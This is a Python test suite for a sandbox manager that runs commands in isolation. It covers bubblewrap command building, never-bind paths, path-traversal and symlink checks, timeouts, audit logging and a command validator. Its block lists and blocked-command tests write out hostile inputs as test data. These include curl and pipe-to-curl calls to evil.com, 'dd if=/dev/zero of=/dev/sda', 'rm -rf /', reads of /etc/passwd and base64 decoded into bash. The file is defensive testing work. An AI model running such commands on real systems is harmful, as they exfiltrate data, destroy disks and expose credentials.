#!/usr/bin/env python3
"""
Tests for the Sandbox Manager (S73 Step 1).

Covers: sandbox lifecycle, file injection/extraction, command execution,
blocked command rejection, timeout enforcement, output truncation,
audit log, config loading, concurrent session limits, path validation,
symlink escape prevention, command validator edge cases, bubblewrap
isolation, degraded mode confirmation, never-bind enforcement, and
bwrap command building.
"""

# Direct imports to avoid needing full opti_oignon package resolution
import importlib.util
import os
import re
import shutil
import sqlite3
import subprocess
import tempfile
import time
from unittest.mock import MagicMock, patch

import pytest

_mod_path = os.path.join(
    os.path.dirname(__file__), os.pardir,
    "opti_oignon", "sandbox_manager.py",
)
_spec = importlib.util.spec_from_file_location("sandbox_manager", _mod_path)
_mod = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_mod)

SandboxConfig = _mod.SandboxConfig
SandboxSession = _mod.SandboxSession
SandboxManager = _mod.SandboxManager
CommandResult = _mod.CommandResult
CommandValidator = _mod.CommandValidator
AuditLog = _mod.AuditLog
IsolationBackend = _mod.IsolationBackend
ApprovalState = _mod.ApprovalState
DEGRADED_WARNING = _mod.DEGRADED_WARNING
validate_sandbox_path = _mod.validate_sandbox_path
_detect_bwrap = _mod._detect_bwrap
_build_bwrap_command = _mod._build_bwrap_command
_HARDCODED_NEVER_BIND = _mod._HARDCODED_NEVER_BIND


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def sandbox_base(tmp_path):
    """Provide a temporary base directory for sandbox workspaces."""
    base = tmp_path / "sandboxes"
    base.mkdir()
    return str(base)


@pytest.fixture
def config(sandbox_base, tmp_path):
    """Provide a SandboxConfig with test-safe defaults."""
    return SandboxConfig(
        enabled=True,
        isolation_backend="tempdir",
        require_degraded_confirmation=False,
        workspace_base=sandbox_base,
        command_timeout=10,
        max_output_bytes=1024,
        max_stderr_bytes=512,
        max_concurrent_sessions=3,
        audit_db_path=str(tmp_path / "test_audit.db"),
        blocked_commands=[
            "sudo",
            "curl",
            "wget",
            "rm -rf /",
            "chmod 777",
            "dd ",
        ],
        blocked_patterns=[
            r"\|\s*(curl|wget|nc)",
            r"`[^`]*`",
            r"\$\(\s*(curl|wget|sudo|rm)",
            r"rm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+)?/",
            r"\.\./\.\.",
            r"/proc/",
            r"/sys/",
            r"base64\s+(-d|--decode).*\|\s*(bash|sh)",
            r"find\s+/\s.*-exec",
        ],
    )


@pytest.fixture
def config_auto(sandbox_base, tmp_path):
    """Config with isolation_backend='auto' for degraded mode tests."""
    return SandboxConfig(
        enabled=True,
        isolation_backend="auto",
        require_degraded_confirmation=True,
        workspace_base=sandbox_base,
        command_timeout=10,
        max_output_bytes=1024,
        max_stderr_bytes=512,
        max_concurrent_sessions=3,
        audit_db_path=str(tmp_path / "auto_audit.db"),
        blocked_commands=["sudo", "curl", "wget"],
        blocked_patterns=[],
    )


@pytest.fixture
def manager(config):
    """Create a SandboxManager in explicit tempdir mode (no confirmation needed)."""
    return SandboxManager(config)


@pytest.fixture
def session(manager):
    """Create a sandbox session and clean up after test."""
    sess = manager.create_sandbox("test-session")
    yield sess
    try:
        manager.destroy_sandbox("test-session")
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Test: Isolation backend detection and resolution
# ---------------------------------------------------------------------------

class TestIsolationBackend:
    """Tests for isolation backend detection and mode selection."""

    def test_backend_enum_values(self):
        """IsolationBackend has correct values."""
        assert IsolationBackend.BWRAP.value == "bwrap"
        assert IsolationBackend.TEMPDIR.value == "tempdir"

    def test_explicit_tempdir_mode(self, config):
        """Explicit tempdir mode sets backend correctly."""
        mgr = SandboxManager(config)
        assert mgr.isolation_backend == IsolationBackend.TEMPDIR
        assert mgr.degraded_mode is True

    def test_auto_mode_without_bwrap(self, config_auto):
        """Auto mode without bwrap falls back to tempdir."""
        with patch.object(
            _mod, "_detect_bwrap", return_value=(False, "not found")
        ):
            mgr = SandboxManager(config_auto)
            assert mgr.isolation_backend == IsolationBackend.TEMPDIR
            assert mgr.degraded_mode is True
            assert mgr.bwrap_available is False

    def test_auto_mode_with_bwrap(self, sandbox_base, tmp_path):
        """Auto mode with bwrap available uses bwrap."""
        cfg = SandboxConfig(
            enabled=True,
            isolation_backend="auto",
            workspace_base=sandbox_base,
            audit_db_path=str(tmp_path / "bwrap_audit.db"),
        )
        with patch.object(
            _mod, "_detect_bwrap", return_value=(True, "bwrap 0.8.0")
        ):
            mgr = SandboxManager(cfg)
            assert mgr.isolation_backend == IsolationBackend.BWRAP
            assert mgr.degraded_mode is False
            assert mgr.bwrap_available is True

    def test_require_bwrap_fails_without_it(self, sandbox_base, tmp_path):
        """isolation_backend='bwrap' raises if bwrap unavailable."""
        cfg = SandboxConfig(
            enabled=True,
            isolation_backend="bwrap",
            workspace_base=sandbox_base,
            audit_db_path=str(tmp_path / "fail_audit.db"),
        )
        with patch.object(
            _mod, "_detect_bwrap", return_value=(False, "not found")
        ):
            with pytest.raises(RuntimeError, match="requires bwrap"):
                SandboxManager(cfg)

    def test_session_records_backend(self, manager):
        """Sessions record which isolation backend was used."""
        sess = manager.create_sandbox("backend-check")
        assert sess.isolation_backend == IsolationBackend.TEMPDIR
        manager.destroy_sandbox("backend-check")

    def test_detect_bwrap_returns_tuple(self):
        """_detect_bwrap returns (bool, str) tuple."""
        available, info = _detect_bwrap()
        assert isinstance(available, bool)
        assert isinstance(info, str)


# ---------------------------------------------------------------------------
# Test: Degraded mode confirmation
# ---------------------------------------------------------------------------

class TestDegradedModeConfirmation:
    """Tests for degraded mode warning and confirmation flow."""

    def test_unconfirmed_degraded_blocks_create(self, config_auto):
        """Cannot create sandbox in degraded mode without confirmation."""
        with patch.object(
            _mod, "_detect_bwrap", return_value=(False, "not found")
        ):
            mgr = SandboxManager(config_auto)
            assert mgr.degraded_mode is True
            assert mgr.degraded_confirmed is False
            with pytest.raises(RuntimeError, match="DEGRADED"):
                mgr.create_sandbox("blocked")

    def test_confirm_degraded_allows_create(self, config_auto):
        """After confirm_degraded_mode(), sandbox creation succeeds."""
        with patch.object(
            _mod, "_detect_bwrap", return_value=(False, "not found")
        ):
            mgr = SandboxManager(config_auto)
            warning = mgr.confirm_degraded_mode()
            assert "WARNING" in warning
            assert "DEGRADED" in warning
            assert mgr.degraded_confirmed is True
            sess = mgr.create_sandbox("confirmed")
            assert sess.active is True
            mgr.destroy_sandbox("confirmed")

    def test_allow_degraded_flag_bypasses_confirmation(self, config_auto):
        """allow_degraded=True on create_sandbox bypasses confirmation."""
        with patch.object(
            _mod, "_detect_bwrap", return_value=(False, "not found")
        ):
            mgr = SandboxManager(config_auto)
            assert mgr.degraded_confirmed is False
            sess = mgr.create_sandbox("bypass", allow_degraded=True)
            assert sess.active is True
            mgr.destroy_sandbox("bypass")

    def test_get_degraded_warning_content(self, config_auto):
        """Degraded warning contains critical information."""
        with patch.object(
            _mod, "_detect_bwrap", return_value=(False, "not found")
        ):
            mgr = SandboxManager(config_auto)
            warning = mgr.get_degraded_warning()
            assert "NOT TRUE ISOLATION" in warning
            assert "SSH keys" in warning
            assert "bubblewrap" in warning.lower()
            assert "sudo apt install" in warning

    def test_no_confirmation_needed_with_bwrap(self, sandbox_base, tmp_path):
        """No confirmation needed when bwrap is available."""
        cfg = SandboxConfig(
            enabled=True,
            isolation_backend="auto",
            require_degraded_confirmation=True,
            workspace_base=sandbox_base,
            audit_db_path=str(tmp_path / "no_confirm_audit.db"),
        )
        with patch.object(
            _mod, "_detect_bwrap", return_value=(True, "bwrap 0.8.0")
        ):
            mgr = SandboxManager(cfg)
            sess = mgr.create_sandbox("no-confirm-needed")
            assert sess.active is True
            mgr.destroy_sandbox("no-confirm-needed")

    def test_disabled_confirmation_allows_degraded(self, sandbox_base, tmp_path):
        """require_degraded_confirmation=False allows without confirm."""
        cfg = SandboxConfig(
            enabled=True,
            isolation_backend="auto",
            require_degraded_confirmation=False,
            workspace_base=sandbox_base,
            audit_db_path=str(tmp_path / "no_req_audit.db"),
        )
        with patch.object(
            _mod, "_detect_bwrap", return_value=(False, "not found")
        ):
            mgr = SandboxManager(cfg)
            sess = mgr.create_sandbox("no-req")
            assert sess.active is True
            mgr.destroy_sandbox("no-req")


# ---------------------------------------------------------------------------
# Test: Bwrap command building
# ---------------------------------------------------------------------------

class TestBwrapCommandBuilding:
    """Tests for _build_bwrap_command."""

    def test_basic_structure(self, config):
        """Bwrap command has correct basic structure."""
        cmd = _build_bwrap_command("echo hello", "/tmp/workspace", config)
        assert cmd[0] == "bwrap"
        assert "--bind" in cmd
        assert "/workspace" in cmd
        assert "--unshare-net" in cmd
        assert "--unshare-pid" in cmd
        assert "--new-session" in cmd
        assert "--die-with-parent" in cmd
        assert "--chdir" in cmd
        assert cmd[-3:] == ["bash", "-c", "echo hello"]

    def test_workspace_bound_readwrite(self, config):
        """Workspace is bound read-write at /workspace."""
        cmd = _build_bwrap_command("ls", "/tmp/ws", config)
        idx = cmd.index("--bind")
        assert cmd[idx + 1] == "/tmp/ws"
        assert cmd[idx + 2] == "/workspace"

    def test_system_paths_readonly(self, config):
        """System paths are bound read-only."""
        config.bwrap_ro_binds = ["/usr", "/bin"]
        cmd = _build_bwrap_command("ls", "/tmp/ws", config)
        ro_indices = [i for i, v in enumerate(cmd) if v == "--ro-bind"]
        assert len(ro_indices) >= 1
        # All ro-binds should be for system paths, not workspace
        for idx in ro_indices:
            assert cmd[idx + 2] != "/workspace"

    def test_never_bind_hardcoded(self, config):
        """Hardcoded never-bind paths are excluded even if in config."""
        config.bwrap_ro_binds = ["/usr", "/home", "/root", "/var"]
        cmd = _build_bwrap_command("ls", "/tmp/ws", config)
        cmd_str = " ".join(cmd)
        # /home, /root, /var must NOT appear as bind sources
        assert "--ro-bind /home" not in cmd_str
        assert "--ro-bind /root" not in cmd_str
        assert "--ro-bind /var" not in cmd_str

    def test_never_bind_config_merged(self, config):
        """Config bwrap_never_bind is merged with hardcoded list."""
        config.bwrap_never_bind = ["/custom/secret"]
        config.bwrap_ro_binds = ["/usr", "/custom/secret"]
        cmd = _build_bwrap_command("ls", "/tmp/ws", config)
        cmd_str = " ".join(cmd)
        assert "--ro-bind /custom/secret" not in cmd_str

    def test_nonexistent_paths_skipped(self, config):
        """Paths that do not exist on host are not bound."""
        config.bwrap_ro_binds = ["/nonexistent/path/xyz"]
        cmd = _build_bwrap_command("ls", "/tmp/ws", config)
        assert "/nonexistent/path/xyz" not in cmd

    def test_dev_proc_tmp_isolated(self, config):
        """Command includes isolated /dev, /proc, /tmp."""
        cmd = _build_bwrap_command("ls", "/tmp/ws", config)
        assert "--dev" in cmd
        assert "--proc" in cmd
        assert "--tmpfs" in cmd
        # /tmp should be a tmpfs, not bound to host /tmp
        idx = cmd.index("--tmpfs")
        assert cmd[idx + 1] == "/tmp"

    def test_network_isolated(self, config):
        """Network is disabled."""
        cmd = _build_bwrap_command("ls", "/tmp/ws", config)
        assert "--unshare-net" in cmd

    def test_pid_isolated(self, config):
        """PID namespace is isolated."""
        cmd = _build_bwrap_command("ls", "/tmp/ws", config)
        assert "--unshare-pid" in cmd


# ---------------------------------------------------------------------------
# Test: Never-bind enforcement
# ---------------------------------------------------------------------------

class TestNeverBind:
    """Tests for the hardcoded never-bind security list."""

    def test_hardcoded_never_bind_contains_critical_paths(self):
        """Hardcoded never-bind includes all critical host paths."""
        assert "/home" in _HARDCODED_NEVER_BIND
        assert "/root" in _HARDCODED_NEVER_BIND
        assert "/etc/shadow" in _HARDCODED_NEVER_BIND
        assert "/etc/ssh" in _HARDCODED_NEVER_BIND
        assert "/mnt" in _HARDCODED_NEVER_BIND
        assert "/boot" in _HARDCODED_NEVER_BIND
        assert "/run" in _HARDCODED_NEVER_BIND

    def test_hardcoded_never_bind_is_frozen(self):
        """Hardcoded never-bind list is a frozenset (immutable)."""
        assert isinstance(_HARDCODED_NEVER_BIND, frozenset)

    def test_subpath_of_never_bind_blocked(self, config):
        """Subpaths of never-bind entries are also blocked."""
        config.bwrap_ro_binds = ["/home/leon/.ssh"]
        cmd = _build_bwrap_command("ls", "/tmp/ws", config)
        cmd_str = " ".join(cmd)
        assert "/home/leon/.ssh" not in cmd_str


# ---------------------------------------------------------------------------
# Test: Sandbox lifecycle
# ---------------------------------------------------------------------------

class TestSandboxLifecycle:
    """Tests for sandbox creation and destruction."""

    def test_create_sandbox_returns_session(self, manager):
        """Creating a sandbox returns a SandboxSession object."""
        sess = manager.create_sandbox("s1")
        assert isinstance(sess, SandboxSession)
        assert sess.session_id == "s1"
        assert sess.active is True
        assert os.path.isdir(sess.workspace_path)
        manager.destroy_sandbox("s1")

    def test_create_sandbox_strict_permissions(self, manager):
        """Sandbox workspace is created with 700 permissions."""
        sess = manager.create_sandbox("s-perms")
        mode = os.stat(sess.workspace_path).st_mode & 0o777
        assert mode == 0o700
        manager.destroy_sandbox("s-perms")

    def test_destroy_sandbox_removes_directory(self, manager):
        """Destroying a sandbox removes its workspace directory."""
        sess = manager.create_sandbox("s-destroy")
        workspace = sess.workspace_path
        assert os.path.isdir(workspace)
        result = manager.destroy_sandbox("s-destroy")
        assert result is True
        assert not os.path.isdir(workspace)

    def test_destroy_nonexistent_returns_false(self, manager):
        """Destroying a nonexistent session returns False."""
        assert manager.destroy_sandbox("nonexistent") is False

    def test_duplicate_session_id_raises(self, manager):
        """Creating a session with an existing ID raises ValueError."""
        manager.create_sandbox("dup")
        with pytest.raises(ValueError, match="already exists"):
            manager.create_sandbox("dup")
        manager.destroy_sandbox("dup")

    def test_get_workspace_path(self, manager, session):
        """get_workspace_path returns the correct path for active session."""
        path = manager.get_workspace_path("test-session")
        assert path == session.workspace_path
        assert os.path.isdir(path)

    def test_get_workspace_path_inactive(self, manager):
        """get_workspace_path returns None for destroyed session."""
        manager.create_sandbox("temp")
        manager.destroy_sandbox("temp")
        assert manager.get_workspace_path("temp") is None

    def test_get_workspace_path_nonexistent(self, manager):
        """get_workspace_path returns None for unknown session."""
        assert manager.get_workspace_path("nope") is None

    def test_list_sessions(self, manager):
        """list_sessions returns correct data."""
        manager.create_sandbox("a")
        manager.create_sandbox("b")
        sessions = manager.list_sessions()
        ids = [s["session_id"] for s in sessions]
        assert "a" in ids
        assert "b" in ids
        # Check isolation backend is reported
        for s in sessions:
            assert "isolation_backend" in s
        manager.destroy_sandbox("a")
        manager.destroy_sandbox("b")

    def test_cleanup_all(self, manager):
        """cleanup_all destroys all active sessions."""
        manager.create_sandbox("c1")
        manager.create_sandbox("c2")
        count = manager.cleanup_all()
        assert count == 2
        assert manager.active_session_count == 0


# ---------------------------------------------------------------------------
# Test: Concurrent session limit
# ---------------------------------------------------------------------------

class TestConcurrentSessions:
    """Tests for concurrent session limits."""

    def test_max_concurrent_sessions(self, manager, config):
        """Cannot exceed max_concurrent_sessions."""
        for i in range(config.max_concurrent_sessions):
            manager.create_sandbox(f"max-{i}")

        with pytest.raises(ValueError, match="Maximum concurrent"):
            manager.create_sandbox("overflow")

        manager.cleanup_all()

    def test_destroying_frees_slot(self, manager, config):
        """Destroying a session frees a slot for a new one."""
        for i in range(config.max_concurrent_sessions):
            manager.create_sandbox(f"slot-{i}")

        manager.destroy_sandbox("slot-0")
        # Should now succeed
        manager.create_sandbox("new-slot")
        manager.cleanup_all()


# ---------------------------------------------------------------------------
# Test: File injection and extraction
# ---------------------------------------------------------------------------

class TestFileInjection:
    """Tests for file injection and extraction."""

    def test_inject_single_file(self, manager, session, tmp_path):
        """Injecting a file copies it into the workspace."""
        src = tmp_path / "input.txt"
        src.write_text("hello sandbox")
        injected = manager.inject_files("test-session", [str(src)])
        assert len(injected) == 1
        assert os.path.isfile(injected[0])
        with open(injected[0]) as fh:
            assert fh.read() == "hello sandbox"

    def test_inject_nonexistent_file_skipped(self, manager, session):
        """Nonexistent source files are silently skipped."""
        injected = manager.inject_files(
            "test-session", ["/nonexistent/file.txt"]
        )
        assert len(injected) == 0

    def test_inject_multiple_files(self, manager, session, tmp_path):
        """Multiple files can be injected at once."""
        files = []
        for name in ["a.py", "b.py", "c.py"]:
            f = tmp_path / name
            f.write_text(f"# {name}")
            files.append(str(f))
        injected = manager.inject_files("test-session", files)
        assert len(injected) == 3

    def test_extract_files_lists_contents(self, manager, session, tmp_path):
        """extract_files lists files in the workspace."""
        src = tmp_path / "data.csv"
        src.write_text("col1,col2\n1,2\n")
        manager.inject_files("test-session", [str(src)])

        files = manager.extract_files("test-session")
        assert len(files) >= 1
        names = [f["path"] for f in files]
        assert "data.csv" in names
        assert files[0]["size"] > 0

    def test_inject_directory(self, manager, session, tmp_path):
        """inject_directory copies a directory tree."""
        src_dir = tmp_path / "project"
        src_dir.mkdir()
        (src_dir / "main.py").write_text("print('hello')")
        (src_dir / "lib").mkdir()
        (src_dir / "lib" / "utils.py").write_text("# utils")

        count = manager.inject_directory("test-session", str(src_dir))
        assert count == 2

    def test_inject_to_inactive_session_raises(self, manager):
        """Injecting into an inactive session raises ValueError."""
        with pytest.raises(ValueError, match="not found"):
            manager.inject_files("nonexistent", ["/tmp/x"])


# ---------------------------------------------------------------------------
# Test: Command execution
# ---------------------------------------------------------------------------

class TestCommandExecution:
    """Tests for sandboxed command execution."""

    def test_simple_command(self, manager, session):
        """A simple echo command returns expected output."""
        result = manager.execute_command("test-session", "echo hello")
        assert result.return_code == 0
        assert "hello" in result.stdout
        assert not result.blocked
        assert not result.timed_out

    def test_command_runs_in_workspace(self, manager, session):
        """Commands execute with cwd set to the workspace."""
        result = manager.execute_command("test-session", "pwd")
        assert result.return_code == 0
        assert session.workspace_path in result.stdout.strip()

    def test_command_sees_injected_files(self, manager, session, tmp_path):
        """Commands can access injected files."""
        src = tmp_path / "greet.txt"
        src.write_text("bonjour")
        manager.inject_files("test-session", [str(src)])
        result = manager.execute_command("test-session", "cat greet.txt")
        assert result.return_code == 0
        assert "bonjour" in result.stdout

    def test_command_can_create_files(self, manager, session):
        """Commands can create files inside the workspace."""
        manager.execute_command(
            "test-session", "echo 'test content' > output.txt"
        )
        files = manager.extract_files("test-session")
        names = [f["path"] for f in files]
        assert "output.txt" in names

    def test_failed_command_return_code(self, manager, session):
        """A failing command reports a non-zero return code."""
        result = manager.execute_command("test-session", "false")
        assert result.return_code != 0

    def test_stderr_captured(self, manager, session):
        """Standard error is captured."""
        result = manager.execute_command(
            "test-session", "echo err >&2"
        )
        assert "err" in result.stderr

    def test_command_updates_count(self, manager, session):
        """Executing commands increments the session command count."""
        assert session.command_count == 0
        manager.execute_command("test-session", "echo 1")
        manager.execute_command("test-session", "echo 2")
        updated = manager.get_session("test-session")
        assert updated.command_count == 2

    def test_execute_on_nonexistent_session_raises(self, manager):
        """Executing on unknown session raises ValueError."""
        with pytest.raises(ValueError, match="not found"):
            manager.execute_command("ghost", "echo hi")

    def test_restricted_environment(self, manager, session):
        """Commands run with a restricted environment (minimal PATH)."""
        result = manager.execute_command("test-session", "echo $HOME")
        assert session.workspace_path in result.stdout.strip()

    def test_result_includes_isolation_backend(self, manager, session):
        """CommandResult reports which isolation backend was used."""
        result = manager.execute_command("test-session", "echo test")
        assert result.isolation_backend == "tempdir"


# ---------------------------------------------------------------------------
# Test: Blocked commands
# ---------------------------------------------------------------------------

class TestBlockedCommands:
    """Tests for command blocking (security enforcement)."""

    def test_sudo_blocked(self, manager, session):
        """sudo commands are blocked."""
        result = manager.execute_command("test-session", "sudo ls")
        assert result.blocked is True
        assert "Blocked" in result.block_reason

    def test_curl_blocked(self, manager, session):
        """curl commands are blocked."""
        result = manager.execute_command(
            "test-session", "curl http://evil.com"
        )
        assert result.blocked is True

    def test_wget_blocked(self, manager, session):
        """wget commands are blocked."""
        result = manager.execute_command(
            "test-session", "wget http://evil.com"
        )
        assert result.blocked is True

    def test_chmod_777_blocked(self, manager, session):
        """chmod 777 is blocked."""
        result = manager.execute_command(
            "test-session", "chmod 777 /tmp/x"
        )
        assert result.blocked is True

    def test_dd_blocked(self, manager, session):
        """dd commands are blocked."""
        result = manager.execute_command(
            "test-session", "dd if=/dev/zero of=/dev/sda"
        )
        assert result.blocked is True

    def test_rm_rf_root_blocked(self, manager, session):
        """rm -rf / is blocked."""
        result = manager.execute_command("test-session", "rm -rf /")
        assert result.blocked is True

    def test_pipe_to_curl_blocked(self, manager, session):
        """Piping output to curl is blocked."""
        result = manager.execute_command(
            "test-session", "cat file | curl http://evil.com"
        )
        assert result.blocked is True

    def test_backtick_injection_blocked(self, manager, session):
        """Backtick command injection is blocked."""
        result = manager.execute_command(
            "test-session", "echo `whoami`"
        )
        assert result.blocked is True

    def test_dollar_paren_injection_blocked(self, manager, session):
        """$() with dangerous commands is blocked."""
        result = manager.execute_command(
            "test-session", "echo $(curl http://evil.com)"
        )
        assert result.blocked is True

    def test_path_traversal_pattern_blocked(self, manager, session):
        """../../ pattern in commands is blocked."""
        result = manager.execute_command(
            "test-session", "cat ../../etc/passwd"
        )
        assert result.blocked is True

    def test_proc_access_blocked(self, manager, session):
        """Access to /proc/ is blocked."""
        result = manager.execute_command(
            "test-session", "cat /proc/cpuinfo"
        )
        assert result.blocked is True

    def test_sys_access_blocked(self, manager, session):
        """Access to /sys/ is blocked."""
        result = manager.execute_command(
            "test-session", "cat /sys/class/net"
        )
        assert result.blocked is True

    def test_safe_command_not_blocked(self, manager, session):
        """Normal safe commands are not blocked."""
        result = manager.execute_command("test-session", "ls -la")
        assert result.blocked is False
        assert result.return_code == 0

    def test_empty_command_blocked(self, manager, session):
        """Empty commands are blocked."""
        result = manager.execute_command("test-session", "")
        assert result.blocked is True

    def test_rm_inside_workspace_allowed(self, manager, session):
        """rm on files within the workspace is allowed."""
        manager.execute_command("test-session", "touch deleteme.txt")
        result = manager.execute_command("test-session", "rm deleteme.txt")
        assert result.blocked is False

    def test_base64_decode_to_shell_blocked(self, manager, session):
        """base64 decode piped to bash is blocked."""
        result = manager.execute_command(
            "test-session",
            "echo c3Vkbw== | base64 -d | bash"
        )
        assert result.blocked is True

    def test_find_exec_on_root_blocked(self, manager, session):
        """find / with -exec is blocked."""
        result = manager.execute_command(
            "test-session",
            "find / -name '*.conf' -exec cat {} \\;"
        )
        assert result.blocked is True

    def test_eval_with_network_blocked(self, manager, session):
        """eval with network modules is blocked."""
        result = manager.execute_command(
            "test-session",
            "python3 -c \"eval('import requests')\""
        )
        # The hardcoded check catches eval+requests
        assert result.blocked is True


# ---------------------------------------------------------------------------
# Test: Timeout enforcement
# ---------------------------------------------------------------------------

class TestTimeoutEnforcement:
    """Tests for command timeout."""

    def test_command_timeout(self, manager, session):
        """A command exceeding the timeout is killed."""
        result = manager.execute_command(
            "test-session", "sleep 60", timeout=1
        )
        assert result.timed_out is True
        assert result.return_code == -1

    def test_fast_command_no_timeout(self, manager, session):
        """A fast command completes without timeout."""
        result = manager.execute_command(
            "test-session", "echo fast", timeout=5
        )
        assert result.timed_out is False
        assert result.return_code == 0


# ---------------------------------------------------------------------------
# Test: Output truncation
# ---------------------------------------------------------------------------

class TestOutputTruncation:
    """Tests for stdout/stderr size caps."""

    def test_stdout_truncated(self, manager, session):
        """Large stdout is truncated to max_output_bytes."""
        result = manager.execute_command(
            "test-session",
            "python3 -c \"print('A' * 5000)\"",
        )
        assert result.truncated_stdout is True
        assert "[OUTPUT TRUNCATED]" in result.stdout

    def test_stderr_truncated(self, manager, session):
        """Large stderr is truncated to max_stderr_bytes."""
        result = manager.execute_command(
            "test-session",
            "python3 -c \"import sys; sys.stderr.write('E' * 2000)\"",
        )
        assert result.truncated_stderr is True
        assert "[STDERR TRUNCATED]" in result.stderr

    def test_small_output_not_truncated(self, manager, session):
        """Small output is not truncated."""
        result = manager.execute_command("test-session", "echo ok")
        assert result.truncated_stdout is False
        assert result.truncated_stderr is False


# ---------------------------------------------------------------------------
# Test: Audit log
# ---------------------------------------------------------------------------

class TestAuditLog:
    """Tests for the SQLite audit log."""

    def test_command_logged(self, manager, session):
        """Executed commands are recorded in the audit log."""
        manager.execute_command("test-session", "echo audited")
        logs = manager.audit.get_session_log("test-session")
        assert len(logs) >= 1
        assert logs[-1]["command"] == "echo audited"
        assert logs[-1]["blocked"] == 0

    def test_blocked_command_logged(self, manager, session):
        """Blocked commands are recorded with block reason."""
        manager.execute_command("test-session", "sudo rm -rf /")
        logs = manager.audit.get_session_log("test-session")
        assert len(logs) >= 1
        last = logs[-1]
        assert last["blocked"] == 1
        assert last["block_reason"] != ""

    def test_timed_out_command_logged(self, manager, session):
        """Timed-out commands are recorded."""
        manager.execute_command("test-session", "sleep 60", timeout=1)
        logs = manager.audit.get_session_log("test-session")
        last = logs[-1]
        assert last["timed_out"] == 1

    def test_audit_records_isolation_backend(self, manager, session):
        """Audit log records which isolation backend was used."""
        manager.execute_command("test-session", "echo backend")
        logs = manager.audit.get_session_log("test-session")
        assert logs[-1]["isolation_backend"] == "tempdir"

    def test_get_all_logs(self, manager, session):
        """get_all_logs returns entries across sessions."""
        manager.execute_command("test-session", "echo 1")
        logs = manager.audit.get_all_logs(limit=10)
        assert len(logs) >= 1

    def test_audit_log_clear(self, manager, session):
        """Audit log can be cleared."""
        manager.execute_command("test-session", "echo temp")
        manager.audit.clear()
        logs = manager.audit.get_all_logs()
        assert len(logs) == 0


# ---------------------------------------------------------------------------
# Test: Config loading
# ---------------------------------------------------------------------------

class TestConfigLoading:
    """Tests for configuration handling."""

    def test_default_config(self):
        """Default SandboxConfig has safe defaults."""
        cfg = SandboxConfig()
        assert cfg.enabled is True
        assert cfg.isolation_backend == "auto"
        assert cfg.require_degraded_confirmation is True
        assert cfg.command_timeout == 30
        assert cfg.max_output_bytes == 65536
        assert cfg.max_concurrent_sessions == 5

    def test_disabled_sandbox_raises(self, sandbox_base, tmp_path):
        """Creating a sandbox when disabled raises RuntimeError."""
        cfg = SandboxConfig(
            enabled=False,
            isolation_backend="tempdir",
            workspace_base=sandbox_base,
            audit_db_path=str(tmp_path / "disabled_audit.db"),
        )
        mgr = SandboxManager(cfg)
        with pytest.raises(RuntimeError, match="disabled"):
            mgr.create_sandbox("nope")

    def test_custom_config_applied(self, sandbox_base, tmp_path):
        """Custom config values are applied correctly."""
        cfg = SandboxConfig(
            enabled=True,
            isolation_backend="tempdir",
            workspace_base=sandbox_base,
            command_timeout=5,
            max_concurrent_sessions=1,
            audit_db_path=str(tmp_path / "custom_audit.db"),
        )
        mgr = SandboxManager(cfg)
        assert mgr.config.command_timeout == 5
        assert mgr.config.max_concurrent_sessions == 1


# ---------------------------------------------------------------------------
# Test: Path validation
# ---------------------------------------------------------------------------

class TestPathValidation:
    """Tests for validate_sandbox_path."""

    def test_relative_path_valid(self, tmp_path):
        """Relative paths resolve inside workspace."""
        workspace = str(tmp_path / "ws")
        os.makedirs(workspace)
        valid, resolved, err = validate_sandbox_path(workspace, "file.txt")
        assert valid is True
        assert resolved.startswith(workspace)
        assert err == ""

    def test_workspace_root_valid(self, tmp_path):
        """The /workspace path itself is valid."""
        workspace = str(tmp_path / "ws")
        os.makedirs(workspace)
        valid, resolved, err = validate_sandbox_path(workspace, "/workspace")
        assert valid is True

    def test_workspace_subpath_valid(self, tmp_path):
        """Paths under /workspace/ are valid."""
        workspace = str(tmp_path / "ws")
        os.makedirs(workspace)
        valid, resolved, err = validate_sandbox_path(
            workspace, "/workspace/src/main.py"
        )
        assert valid is True
        assert resolved.endswith("src/main.py")

    def test_absolute_outside_rejected(self, tmp_path):
        """Absolute paths outside /workspace/ are rejected."""
        workspace = str(tmp_path / "ws")
        os.makedirs(workspace)
        valid, _, err = validate_sandbox_path(workspace, "/etc/passwd")
        assert valid is False
        assert "outside sandbox" in err

    def test_dotdot_traversal_rejected(self, tmp_path):
        """.. path traversal is rejected."""
        workspace = str(tmp_path / "ws")
        os.makedirs(workspace)
        valid, _, err = validate_sandbox_path(
            workspace, "../../../etc/passwd"
        )
        assert valid is False
        assert "traversal" in err.lower() or "escapes" in err.lower()

    def test_symlink_escape_rejected(self, tmp_path):
        """Symlinks pointing outside workspace are rejected."""
        workspace = str(tmp_path / "ws")
        os.makedirs(workspace)
        link_path = os.path.join(workspace, "escape_link")
        os.symlink("/tmp", link_path)
        valid, _, err = validate_sandbox_path(workspace, "escape_link")
        assert valid is False
        assert "escape" in err.lower() or "traversal" in err.lower()

    def test_empty_path_rejected(self, tmp_path):
        """Empty path is rejected."""
        workspace = str(tmp_path / "ws")
        os.makedirs(workspace)
        valid, _, err = validate_sandbox_path(workspace, "")
        assert valid is False

    def test_nested_relative_valid(self, tmp_path):
        """Nested relative paths stay inside workspace."""
        workspace = str(tmp_path / "ws")
        os.makedirs(workspace)
        valid, resolved, err = validate_sandbox_path(
            workspace, "src/lib/utils.py"
        )
        assert valid is True
        assert resolved.startswith(workspace)


# ---------------------------------------------------------------------------
# Test: CommandValidator edge cases
# ---------------------------------------------------------------------------

class TestCommandValidator:
    """Tests for the CommandValidator class."""

    def test_safe_ls(self, config):
        """ls is allowed."""
        v = CommandValidator(config)
        safe, _ = v.validate("ls -la")
        assert safe is True

    def test_safe_cat(self, config):
        """cat on a normal file is allowed."""
        v = CommandValidator(config)
        safe, _ = v.validate("cat readme.md")
        assert safe is True

    def test_safe_python(self, config):
        """Simple python script is allowed."""
        v = CommandValidator(config)
        safe, _ = v.validate("python3 main.py")
        assert safe is True

    def test_safe_grep(self, config):
        """grep is allowed."""
        v = CommandValidator(config)
        safe, _ = v.validate("grep -r 'def test' tests/")
        assert safe is True

    def test_safe_mkdir(self, config):
        """mkdir is allowed."""
        v = CommandValidator(config)
        safe, _ = v.validate("mkdir -p src/lib")
        assert safe is True

    def test_mixed_case_sudo_blocked(self, config):
        """Sudo is case-insensitively blocked."""
        v = CommandValidator(config)
        safe, _ = v.validate("Sudo apt install")
        assert safe is False

